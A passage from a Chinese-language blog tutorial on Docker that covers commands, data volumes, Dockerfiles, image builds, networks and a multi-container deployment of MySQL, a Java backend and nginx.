src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-13%2009.55.08.png" alt="截屏2024-12-13 09.55.08" style="zoom:50%;"><p>成功拉取得。</p><p>所以核心中的核心就是拿到流畅可用的镜像仓库地址。</p></blockquote><h2 id="3-3-访问测试"><a href="#3-3-访问测试" class="headerlink" title="3.3 访问测试"></a>3.3 访问测试</h2><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-13%2011.24.57.png" style="zoom:50%;"><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-13%2011.23.39.png" style="zoom:40%;"><h1 id="四、Docker命令基础"><a href="#四、Docker命令基础" class="headerlink" title="四、Docker命令基础"></a>四、Docker命令基础</h1><h2 id="4-1-镜像命名规范"><a href="#4-1-镜像命名规范" class="headerlink" title="4.1 镜像命名规范"></a>4.1 镜像命名规范</h2><p>镜像名称一般分两部分组成：[repository]:[tag]。</p><ul><li><p>其中repository就是镜像名</p></li><li><p>tag是镜像的版本</p></li></ul><p>在没有指定tag时，默认是latest，代表最新版本的镜像。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-13%2011.28.36.png" style="zoom:40%;"><h2 id="4-2-命令概述"><a href="#4-2-命令概述" class="headerlink" title="4.2 命令概述"></a>4.2 命令概述</h2><p>Docker最常见的命令就是操作镜像、容器的命令，详见官方文档：<a href="https://docs.docker.com/"> https://docs.docker.com/</a></p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-13%2011.30.50.png" alt="docker命令概览" style="zoom:50%;"><h2 id="4-3-案例练习"><a href="#4-3-案例练习" class="headerlink" title="4.3 案例练习"></a>4.3 案例练习</h2><p>在DockerHub中搜索Nginx镜像，查看镜像的名称</p><ul><li><p>拉取Nginx镜像：docker pull 镜像名</p></li><li><p>查看本地镜像列表：docker images</p></li><li><p>创建并运行Nginx容器：docker run -d </p></li><li><p>查看容器： docker images</p></li><li><p>停止容器：docker stop</p></li><li><p>再次启动容器：docker start</p></li><li><p>进入Nginx容器：docker exec -it</p></li><li><p>删除容器：docker rm</p></li></ul><h2 id="4-4-命令别名"><a href="#4-4-命令别名" class="headerlink" title="4.4 命令别名"></a>4.4 命令别名</h2><p>docker ps的输出可读性较差，如下图所示：</p><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-13%2013.20.30.png" alt="截屏2024-12-13 13.20.30"></p><p>为了简化docker ps命令的输出，通常会用如下的命令来查看容器信息：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> <span class="token function">ps</span> <span class="token parameter variable">--format</span> <span class="token string">"table {{.ID}}<span class="token entity" title="\t">\t</span> {{.Image}}<span class="token entity" title="\t">\t</span>{{.Ports}}<span class="token entity" title="\t">\t</span>{{.Status}}<span class="token entity" title="\t">\t</span>{{.Names}}"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>命令冗长不便于记忆，可以在～/.bashrc中命名一个别名。编辑～/.bashrc，添加如下内容（顺便把docker images也简化了）：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> ～/.bashrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-13%2013.22.01.png" alt="截屏2024-12-13 13.22.01"></p><p>-a 参数是为了显示那些停止运行但没有被删除的容器。</p><p>保存退出之后，执行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">source</span> ～/.bashrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>测试：</p><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-13%2013.19.39.png" alt="截屏2024-12-13 13.19.39"></p><h1 id="五、数据卷"><a href="#五、数据卷" class="headerlink" title="五、数据卷"></a>五、数据卷</h1><h2 id="5-1-数据卷"><a href="#5-1-数据卷" class="headerlink" title="5.1 数据卷"></a>5.1 数据卷</h2><p>数据卷（volume）是一个虚拟目录，是容器内目录与宿主机目录之间映射的桥梁。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-13%2013.28.19.png" style="zoom:50%;"><p>如图所示，通过创建数据卷可以实现宿主机目录和容器目录的同步读写操作。</p><h2 id="5-2-数据卷相关的命令"><a href="#5-2-数据卷相关的命令" class="headerlink" title="5.2 数据卷相关的命令"></a>5.2 数据卷相关的命令</h2><table><thead><tr><th>命令</th><th>说明</th><th>文档地址</th></tr></thead><tbody><tr><td>docker volume create</td><td>创建数据卷</td><td><a href="https://docs.docker.com/engine/reference/commandline/volume_create/">docker   volume create</a></td></tr><tr><td>docker volume ls</td><td>查看所有数据卷</td><td><a href="https://docs.docker.com/engine/reference/commandline/volume_ls/">docker   volume ls</a></td></tr><tr><td>docker volume rm</td><td>删除指定数据卷</td><td><a href="https://docs.docker.com/engine/reference/commandline/volume_prune/">docker   volume rm</a></td></tr><tr><td>docker volume inspect</td><td>查看某个数据卷的详情</td><td><a href="https://docs.docker.com/engine/reference/commandline/volume_inspect/">docker   volume inspect</a></td></tr><tr><td>docker volume prune</td><td>清除数据卷</td><td><a href="https://docs.docker.com/engine/reference/commandline/volume_prune/">docker   volume prune</a></td></tr></tbody></table><h2 id="5-3-案例一（卷名挂载）"><a href="#5-3-案例一（卷名挂载）" class="headerlink" title="5.3 案例一（卷名挂载）"></a>5.3 案例一（卷名挂载）</h2><h3 id="5-3-1-案例描述"><a href="#5-3-1-案例描述" class="headerlink" title="5.3.1 案例描述"></a>5.3.1 案例描述</h3><ul><li>创建Nginx容器，修改nginx容器内的html目录下的index.html文件，查看变化</li></ul><blockquote><p>尝试进入容器进行修改，发现vi命令不存在。这是因为镜像一般都是最小化安装，并没有提前预置各种工具。</p></blockquote><ul><li>将静态资源部署到nginx的html目录</li></ul><blockquote><p>想从宿主机拷贝资源到容器中该怎么办？</p></blockquote><h3 id="5-3-2-案例解决"><a href="#5-3-2-案例解决" class="headerlink" title="5.3.2 案例解决"></a>5.3.2 案例解决</h3><p>在执行docker run命令时，使用 <strong>-v</strong>  数据卷:容器内目录可以完成数据卷挂载</p><p>当创建容器时，如果挂载了数据卷且数据卷不存在，会自动创建数据卷</p><p>下图为案例5.1的解决，在docker run 创建容器的时候，-v指定数据卷。</p><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-13%2013.49.08.png" alt="截屏2024-12-13 13.49.08"></p><blockquote><p>回顾：</p><p>什么是数据卷？</p><ul><li>数据卷是一个虚拟目录，它将宿主机目录映射到容器内目录，方便我们操作容器内文件，或者方便迁移容器产生的数据。</li></ul><p>如何挂载数据卷？</p><ul><li>在创建容器时，利用 -v 数据卷名：容器内目录完成挂载</li><li>容器创建时，如果发现挂载的数据卷不存在时，会自动创建</li></ul><p>数据卷的常见命令有哪些？</p><ul><li>docker volume ls: 查看数据卷</li><li>docker volume rm: 删除数据卷。</li><li>docker volume inspect: 查看数据卷详情。</li><li>docker volume prune:  删除未使用的数据卷。</li></ul></blockquote><h2 id="5-4-案例二（宿主机目录挂载）"><a href="#5-4-案例二（宿主机目录挂载）" class="headerlink" title="5.4 案例二（宿主机目录挂载）"></a>5.4 案例二（宿主机目录挂载）</h2><h3 id="5-4-1-案例描述"><a href="#5-4-1-案例描述" class="headerlink" title="5.4.1 案例描述"></a>5.4.1 案例描述</h3><p>需求：</p><ul><li><p>查看mysql容器，判断是否有数据卷挂载</p></li><li><p>基于宿主机目录实现MySQL数据目录、配置文件、初始化脚本的挂载（查阅官方镜像文档）</p></li></ul><p>①挂载/root/mysql/data到容器内的/var/lib/mysql目录</p><p>②挂载/root/mysql/init到容器内的/docker-entrypoint-initdb.d目录，提前准备的SQL脚本</p><p>③挂载/root/mysql/conf到容器内的/etc/mysql/conf.d目录，提前准备的配置文件。</p><h3 id="5-4-2-案例解决"><a href="#5-4-2-案例解决" class="headerlink" title="5.4.2 案例解决"></a>5.4.2 案例解决</h3><p>在执行docker run命令时，使用 <strong>-v</strong> <strong>本地目录</strong> <strong>:</strong> <strong>容器内目录</strong> 可以完成本地目录挂载</p><p>本地目录必须以“**/<strong>”或 “</strong>./**” 开头，如果直接以名称开头，会被识别为数据卷而非本地目录</p><ul><li><p>-v mysql:/var/lib/mysql 会被识别为一个数据卷叫mysql</p></li><li><p>-v ./mysql:/var/lib/mysql 会被识别为当前目录下的mysql目录</p></li></ul><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-13%2016.34.22.png" alt="截屏2024-12-13 16.34.22"></p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-13%2016.36.13.png" style="zoom:50%;"><p>测试数据成功生成，说明我们挂载的本地init目录中的sql脚本被成功执行。</p><h1 id="六、自定义镜像"><a href="#六、自定义镜像" class="headerlink" title="六、自定义镜像"></a>六、自定义镜像</h1><h2 id="6-1-镜像结构"><a href="#6-1-镜像结构" class="headerlink" title="6.1 镜像结构"></a>6.1 镜像结构</h2><p>镜像就是包含了程序运行的系统函数库、应用程序、运行配置等文件的文件包。构建镜像的过程其实就是把上述文件打包的过程。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-17%2010.24.35.png" style="zoom:40%;"><p>镜像结构：</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-17%2010.26.13.png" style="zoom:35%;"><h2 id="6-2-Dockerfile"><a href="#6-2-Dockerfile" class="headerlink" title="6.2 Dockerfile"></a>6.2 Dockerfile</h2><p><strong>Dockerfile</strong>就是一个文本文件，其中包含一个个的<strong>指令</strong>(Instruction)，用指令来说明要执行什么操作来构建镜像。将来Docker可以根据Dockerfile帮我们构建镜像。常见指令如下：</p><table><thead><tr><th><strong>指令</strong></th><th><strong>说明</strong></th><th><strong>示例</strong></th></tr></thead><tbody><tr><td>FROM</td><td>指定基础镜像</td><td>FROM centos:6</td></tr><tr><td>ENV</td><td>设置环境变量，可在后面指令使用</td><td>ENV key value</td></tr><tr><td>COPY</td><td>拷贝本地文件到镜像的指定目录</td><td>COPY ./jre11.tar.gz /tmp</td></tr><tr><td>RUN</td><td>执行Linux的shell命令，一般是安装过程的命令</td><td>RUN tar -zxvf /tmp/jre11.tar.gz  &amp;&amp; EXPORTS  path=/tmp/jre11:$path</td></tr><tr><td>EXPOSE</td><td>指定容器运行时监听的端口，是给镜像使用者看的</td><td>EXPOSE 8080</td></tr><tr><td>ENTRYPOINT</td><td>镜像中应用的启动命令，容器运行时调用</td><td>ENTRYPOINT java -jar xx.jar</td></tr></tbody></table><p>更新详细语法说明，请参考官网文档： <a href="https://docs.docker.com/engine/reference/builder">https://docs.docker.com/engine/reference/builder</a></p><ul><li>示例：</li></ul><p>我们可以基于Ubuntu基础镜像，利用Dockerfile描述镜像结构。</p><pre class="line-numbers language-docker" data-language="docker"><code class="language-docker"><span class="token comment"># 指定基础镜像</span><span class="token instruction"><span class="token keyword">FROM</span> ubuntu:16.04</span><span class="token comment"># 配置环境变量，JDK的安装目录、容器内时区</span><span class="token instruction"><span class="token keyword">ENV</span> JAVA_DIR=/usr/local</span><span class="token comment"># 拷贝jdk和java项目的包</span><span class="token instruction"><span class="token keyword">COPY</span> ./jdk8.tar.gz <span class="token variable">$JAVA_DIR</span>/</span><span class="token instruction"><span class="token keyword">COPY</span> ./docker-demo.jar /tmp/app.jar</span><span class="token comment"># 安装JDK</span><span class="token instruction"><span class="token keyword">RUN</span> cd <span class="token variable">$JAVA_DIR</span> \ &amp;&amp; tar -xf ./jdk8.tar.gz \ &amp;&amp; mv ./jdk1.8.0_144 ./java8</span><span class="token comment"># 配置环境变量</span><span class="token instruction"><span class="token keyword">ENV</span> JAVA_HOME=<span class="token variable">$JAVA_DIR</span>/java8</span><span class="token instruction"><span class="token keyword">ENV</span> PATH=<span class="token variable">$PATH</span>:<span class="token variable">$JAVA_HOME</span>/bin</span><span class="token comment"># 入口，java项目的启动命令</span><span class="token instruction"><span class="token keyword">ENTRYPOINT</span> [<span class="token string">"java"</span>, <span class="token string">"-jar"</span>, <span class="token string">"/app.jar"</span>]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们可以基于Ubuntu基础镜像，利用Dockerfile描述镜像结构,也可以直接基于JDK为基础镜像，省略前面的步骤：</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-17%2010.31.26.png" style="zoom:40%;"><h2 id="6-3-构建镜像"><a href="#6-3-构建镜像" class="headerlink" title="6.3 构建镜像"></a>6.3 构建镜像</h2><pre class="line-numbers language-docker" data-language="docker"><code class="language-docker"><span class="token comment"># 基础镜像</span><span class="token instruction"><span class="token keyword">FROM</span> openjdk:11.0-jre-buster</span><span class="token comment"># 拷贝jar包</span><span class="token instruction"><span class="token keyword">COPY</span> docker-demo.jar /app.jar</span><span class="token comment"># 入口</span><span class="token instruction"><span class="token keyword">ENTRYPOINT</span> [<span class="token string">"java"</span>, <span class="token string">"-jar"</span>, <span class="token string">"/app.jar"</span>]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当编写好了Dockerfile，可以利用下面命令来构建镜像:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> build <span class="token parameter variable">-t</span> myImage:1.0 <span class="token builtin class-name">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p><strong>-t</strong> ：是给镜像起名，格式依然是repository:tag的格式，不指定tag时，默认为latest</p><p> <strong>.</strong> ：是指定Dockerfile所在目录，如果就在当前目录，则指定为”.”</p></blockquote><h2 id="6-3-构建镜像并运行（EX）"><a href="#6-3-构建镜像并运行（EX）" class="headerlink" title="6.3 构建镜像并运行（EX）"></a>6.3 构建镜像并运行（EX）</h2><h3 id="6-3-1-构建镜像"><a href="#6-3-1-构建镜像" class="headerlink" title="6.3.1 构建镜像"></a>6.3.1 构建镜像</h3><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-17%2010.45.58.png" style="zoom:50%;"><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-17%2010.48.56.png" alt="截屏2024-12-17 10.48.56" style="zoom:50%;"><blockquote><p>注意镜像名称不能有大写字母。</p></blockquote><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-17%2010.59.38.png" style="zoom:50%;"><p>获取基础镜像时报错。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-17%2010.59.19.png" style="zoom:50%;"><p>单独拉取一下openjdk:11.0-jre-buster镜像。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-17%2011.00.43.png" alt="截屏2024-12-17 11.00.43" style="zoom:50%;"><p>然后重新运行构建镜像的命令。</p><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-17%2011.01.17.png" alt="截屏2024-12-17 11.01.17"></p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-17%2011.01.37.png" alt="截屏2024-12-17 11.01.37" style="zoom:50%;"><h3 id="6-3-2-运行容器"><a href="#6-3-2-运行容器" class="headerlink" title="6.3.2 运行容器"></a>6.3.2 运行容器</h3><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-17%2011.03.22.png" alt="截屏2024-12-17 11.03.22"></p><h3 id="6-3-3-访问测试"><a href="#6-3-3-访问测试" class="headerlink" title="6.3.3 访问测试"></a>6.3.3 访问测试</h3><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-17%2011.06.03.png" alt="截屏2024-12-17 11.06.03" style="zoom:50%;"><p>成功访问到容器内的应用。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>镜像的结构是怎样的？</li></ul><p>镜像中包含了应用程序所需要的运行环境、函数库、配置、以及应用本身等各种文件，这些文件分层打包而成。</p><ul><li>Dockerfile是做什么的？</li></ul><p>Dockerfile就是利用固定的指令来描述镜像的结构和构建过程，这样Docker才可以依次来构建镜像。</p><ul><li>构建镜像的命令是什么？</li></ul><p>docker build -t 镜像名 Dockerfile目录</p><h1 id="七、Docker网络"><a href="#七、Docker网络" class="headerlink" title="七、Docker网络"></a>七、Docker网络</h1><p>默认情况下，所有容器都是以bridge方式连接到Docker的一个虚拟网桥上：</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-18%2009.13.28.png" style="zoom:40%;"><p>docker inspect 来查看容器的网络配置。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-18%2009.17.45.png" style="zoom:40%;"><p>网络，加入自定义网络的容器可以通过容器名互相访问，Docker的网络操作命令如下：</p><table><thead><tr><th><strong>命令</strong></th><th><strong>说明</strong></th><th><strong>文档地址</strong></th></tr></thead><tbody><tr><td>docker network create</td><td>创建一个网络</td><td><a href="https://docs.docker.com/engine/reference/commandline/network_create/">docker   network create</a></td></tr><tr><td>docker network ls</td><td>查看所有网络</td><td><a href="https://docs.docker.com/engine/reference/commandline/network_ls/">docker   network ls</a></td></tr><tr><td>docker network rm</td><td>删除指定网络</td><td><a href="https://docs.docker.com/engine/reference/commandline/network_rm/">docker   network rm</a></td></tr><tr><td>docker network prune</td><td>清除未使用的网络</td><td><a href="https://docs.docker.com/engine/reference/commandline/network_prune/">docker   network prune</a></td></tr><tr><td>docker network connect</td><td>使指定容器连接加入某网络</td><td><a href="https://docs.docker.com/engine/reference/commandline/network_connect/">docker   network connect</a></td></tr><tr><td>docker network disconnect</td><td>使指定容器连接离开某网络</td><td><a href="https://docs.docker.com/engine/reference/commandline/network_disconnect/">docker   network disconnect</a></td></tr><tr><td>docker network inspect</td><td>查看网络详细信息</td><td><a href="https://docs.docker.com/engine/reference/commandline/network_inspect/">docker   network inspect</a></td></tr></tbody></table><ul><li>可以在docker  run 的时候通过 –networks 指定网络名。</li></ul><h1 id="八、分容器项目部署"><a href="#八、分容器项目部署" class="headerlink" title="八、分容器项目部署"></a>八、分容器项目部署</h1><p>创建网络：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># docker network create heima</span>9a85558bc3ab76e21390a914afb454051467c183fa972c5e0782efcdab286538<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>后续创建的容器使用–networks heima指定网络名。</p><h2 id="8-1-部署mysql数据库容器"><a href="#8-1-部署mysql数据库容器" class="headerlink" title="8.1 部署mysql数据库容器"></a>8.1 部署mysql数据库容器</h2><ul><li>注意保持java后端项目数据库的配置和mysql容器本身配置的连通性。</li></ul><p>mysql数据库容器的容器名mysql，密码123。只有这样，在网络连通的前提下，才能保证java后端应用能够成功访问到mysql容器。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-18%2009.39.26.png" alt="截屏2024-12-18 09.39.26" style="zoom:50%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> run <span class="token parameter variable">-d</span> <span class="token parameter variable">--name</span> mysql <span class="token parameter variable">-p</span> <span class="token number">3306</span>:3306 <span class="token parameter variable">-e</span> <span class="token assign-left variable">MYSQL_ROOT_PASSWORD</span><span class="token operator">=</span><span class="token number">123</span> <span class="token parameter variable">-v</span> /root/mysql/data:/var/lib/mysql <span class="token parameter variable">-v</span> /root/mysql/conf:/etc/mysql/conf.d <span class="token parameter variable">-v</span> /root/mysql/init:/docker-entrypoint-initdb.d <span class="token parameter variable">--network</span> heima mysql<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="8-2-部署Java后端应用容器"><a href="#8-2-部署Java后端应用容器" class="headerlink" title="8.2 部署Java后端应用容器"></a>8.2 部署Java后端应用容器</h2><ul><li>注意保持java后端项目数据库的配置和mysql容器本身配置的连通性。</li></ul><p>用idea打开项目，通过maven把需要的库都安装一下，然后打包成jar包（注意跳过单元测试）。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-18%2009.56.53.png" style="zoom:50%;"><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-18%2009.57.30.png" style="zoom:50%;"><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-18%2009.59.50.png" style="zoom:50%;"><p>dockerfile:</p><pre class="line-numbers language-docker" data-language="docker"><code class="language-docker"><span class="token comment"># 基础镜像</span><span class="token instruction"><span class="token keyword">FROM</span> openjdk:11.0-jre-buster</span><span class="token comment"># 设定时区</span><span class="token instruction"><span class="token keyword">ENV</span> TZ=Asia/Shanghai</span><span class="token instruction"><span class="token keyword">RUN</span> ln -snf /usr/share/zoneinfo/<span class="token variable">$TZ</span> /etc/localtime &amp;&amp; echo <span class="token variable">$TZ</span> &gt; /etc/timezone</span><span class="token comment"># 拷贝jar包</span><span class="token instruction"><span class="token keyword">COPY</span> hm-service.jar /app.jar</span><span class="token comment"># 入口</span><span class="token instruction"><span class="token keyword">ENTRYPOINT</span> [<span class="token string">"java"</span>, <span class="token string">"-jar"</span>, <span class="token string">"/app.jar"</span>]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上传到目标机器中，然后制作镜像。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-18%2010.03.05.png" alt="截屏2024-12-18 10.03.05" style="zoom:50%;"><p>制作镜像：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> build <span class="token parameter variable">-t</span> hmall <span class="token builtin class-name">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-18%2010.04.36.png" alt="截屏2024-12-18 10.04.36"></p><p>启动容器：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost hm-service<span class="token punctuation">]</span><span class="token comment"># docker run -d --name hmall -p 8080:8080 --network heima hmall</span>e5c900979c64be115676c294396e7ebc4deafdcba44c91ac49cc172cddaceed9<span class="token punctuation">[</span>root@localhost hm-service<span class="token punctuation">]</span><span class="token comment"># dps</span>CONTAINER ID    IMAGE          PORTS                                                  STATUS          NAMESe5c900979c64    hmall          <span class="token number">0.0</span>.0.0:8080-<span class="token operator">&gt;</span><span class="token number">8080</span>/tcp, :::8080-<span class="token operator">&gt;</span><span class="token number">8080</span>/tcp              Up <span class="token number">2</span> seconds    hmalla26885a896d6    mysql          <span class="token number">0.0</span>.0.0:3306-<span class="token operator">&gt;</span><span class="token number">3306</span>/tcp, :::3306-<span class="token operator">&gt;</span><span class="token number">3306</span>/tcp, <span class="token number">33060</span>/tcp   Up <span class="token number">16</span> minutes   mysql1266a9029269    nginx:latest   <span class="token number">0.0</span>.0.0:8000-<span class="token operator">&gt;</span><span class="token number">80</span>/tcp, :::8000-<span class="token operator">&gt;</span><span class="token number">80</span>/tcp                  Up <span class="token number">23</span> hours     nginxOnCentOS<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>docker logs -f hmall 查看日志。</p><p>访问测试：</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-18%2010.09.13.png" style="zoom:50%;"><p>访问<a href="http://192.168.155.34:8080/search/list?pageNo=1&amp;pageSize=5">http://192.168.155.34:8080/search/list?pageNo=1&amp;pageSize=5</a> 接口报错：</p><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-18%2010.11.46.png" alt="截屏2024-12-18 10.11.46"></p><p>进入hmall容器ping mysql容器，可以连通。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-18%2010.13.10.png" style="zoom:33%;"><p>但是mysql容器中没有ping、ipaddr之类的命令。</p><p>网络结构：</p><p>​     虚拟网卡：172.18.0.1 </p><p>​     mysql：172.18.0.2</p><p>​     hmall：172.18.0.3</p><p>登入mysql容器，执行mysql登录命令：mysq -uroot -p 发现密码是123.com才能登录。但是之前创建数据库的时候明明使用-e参数配置的密码是123呀，可能是挂在时没有清空宿主机data目录（目录里面观察到有一些鉴权的组件）的原因。</p><p>清空data目录之后，重新安装mysql：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost hm-service<span class="token punctuation">]</span><span class="token comment"># docker run -d --name hmall -p 8080:8080 --network heima hmall</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>进入容器用123的密码成功登录。</p><p>继续访问测试页面，成功获取到后台的数据。</p><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-18%2010.39.43.png" alt="截屏2024-12-18 10.39.43"></p><p>至此，后端应用容器和数据库容器成功部署。</p><h2 id="8-3-部署前端nginx容器"><a href="#8-3-部署前端nginx容器" class="headerlink" title="8.3 部署前端nginx容器"></a>8.3 部署前端nginx容器</h2><p>创建一个新的nginx容器，将提供的nginx.conf、html目录与容器挂载。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost nginx<span class="token punctuation">]</span><span class="token comment"># docker run -d --name nginx -p 18080:18080 -p 18081:18081 --network heima -v /root/nginx/html/:/usr/share/nginx/html -v /root/nginx/nginx.conf:/etc/nginx/nginx.conf nginx</span>19eeda1700ee6815e1b4b92a8dc0ba7ffbf6c9085fdb8a18f0ce9404ee97bf3d<span class="token punctuation">[</span>root@localhost nginx<span class="token punctuation">]</span><span class="token comment"># dps</span>CONTAINER ID    IMAGE    PORTS                                                                           STATUS          NAMES19eeda1700ee    nginx    <span class="token number">80</span>/tcp, <span class="token number">0.0</span>.0.0:18080-18081-<span class="token operator">&gt;</span><span class="token number">18080</span>-18081/tcp, :::18080-18081-<span class="token operator">&gt;</span><span class="token number">18080</span>-18081/tcp   Up <span class="token number">1</span> second     nginx25761d94c3db    mysql    <span class="token number">0.0</span>.0.0:3306-<span class="token operator">&gt;</span><span class="token number">3306</span>/tcp, :::3306-<span class="token operator">&gt;</span><span class="token number">3306</span>/tcp, <span class="token number">33060</span>/tcp                            Up <span class="token number">28</span> minutes   mysqle5c900979c64    hmall    <span class="token number">0.0</span>.0.0:8080-<span class="token operator">&gt;</span><span class="token number">8080</span>/tcp, :::8080-<span class="token operator">&gt;</span><span class="token number">8080</span>/tcp                                       Up <span class="token number">56</span> minutes   hmall<span class="token punctuation">[</span>root@localhost nginx<span class="token punctuation">]</span><span class="token comment"># </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>nginx配置文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">worker_processes  <span class="token number">1</span><span class="token punctuation">;</span>events <span class="token punctuation">{</span>    worker_connections  <span class="token number">1024</span><span class="token punctuation">;</span><span class="token punctuation">}</span>http <span class="token punctuation">{</span>    include       mime.types<span class="token punctuation">;</span>    default_type  application/json<span class="token punctuation">;</span>    sendfile        on<span class="token punctuation">;</span>        keepalive_timeout  <span class="token number">65</span><span class="token punctuation">;</span>    server <span class="token punctuation">{</span>        listen       <span class="token number">18080</span><span class="token punctuation">;</span>        <span class="token comment"># 指定前端项目所在的位置</span>        location / <span class="token punctuation">{</span>            root /usr/share/nginx/html/hmall-portal<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    